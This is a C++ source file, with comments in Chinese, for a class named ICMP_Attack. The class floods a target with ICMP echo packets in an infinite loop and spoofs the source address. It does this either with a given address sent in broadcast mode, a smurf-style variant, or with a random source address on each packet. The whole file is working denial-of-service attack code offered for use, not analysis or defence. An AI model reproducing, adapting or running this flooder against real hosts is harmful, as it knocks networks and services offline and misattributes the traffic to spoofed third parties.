#include "icmp_attack.h"

#define PACKET_SIZE (1024)

/**
 * @brief 初始化ICMP包头
 *
 * @param icmp_pack ICMP包头对象
 */
void ICMP_Attack::init_pack(icmp *icmp_pack) {
    icmp_pack->icmp_type = ICMP_ECHO;  // 回显请求
    icmp_pack->icmp_code = 0;
    icmp_pack->icmp_cksum = 0;
    icmp_pack->icmp_seq = 0;
    icmp_pack->icmp_id = rand();

    // 计算校验和
    icmp_pack->icmp_cksum =
        IP_PACK::checksum((unsigned short *)icmp_pack, sizeof(struct icmp));
}

/**
 * @brief 以指定源向指定目标发送ICMP报文
 *
 * @param source 源地址
 * @param dest 目标地址
 */
void ICMP_Attack::start(char *source, char *dest) {
    this->start(inet_addr(source), inet_addr(dest));
}

/**
 * @brief 以指定源向指定目标发送ICMP报文
 *
 * @param source 源地址
 * @param dest 目标地址
 */
void ICMP_Attack::start(in_addr_t source, in_addr_t dest) {
    // 使用广播方式发送数据包
    this->ip_pack.setBroadcastState(true);

    addr.sin_addr.s_addr = dest;  // 设置目标地址

    struct icmp *icmp_pack = (struct icmp *)malloc(PACKET_SIZE);

    this->init_pack(icmp_pack);  // 初始化ICMP报文

    this->ip_pack.setSource(source);  // 设置源地址

    // 循环发送数据包
    while (true) this->ip_pack.sendPack(icmp_pack, PACKET_SIZE, addr);

    free(icmp_pack);
}

/**
 * @brief 使用随机源地址向目的地址发送数据包
 *
 * @param dest 目的地址
 */
void ICMP_Attack::start_rand_source(char *dest) {
    this->start_rand_source(inet_addr(dest));
}

/**
 * @brief 使用随机源地址向目的地址发送数据包
 *
 * @param dest 目的地址
 */
void ICMP_Attack::start_rand_source(in_addr_t dest) {
    // 不使用广播方式发送数据包
    this->ip_pack.setBroadcastState(false);

    addr.sin_addr.s_addr = dest;  // 设置攻击目标

    struct icmp *icmp_pack = (struct icmp *)malloc(PACKET_SIZE);

    this->init_pack(icmp_pack);  // 初始化ICMP报文

    // 使用随机源地址循环发送数据包
    while (true) this->ip_pack.sendPack(icmp_pack, PACKET_SIZE, rand(), addr);

    free(icmp_pack);
}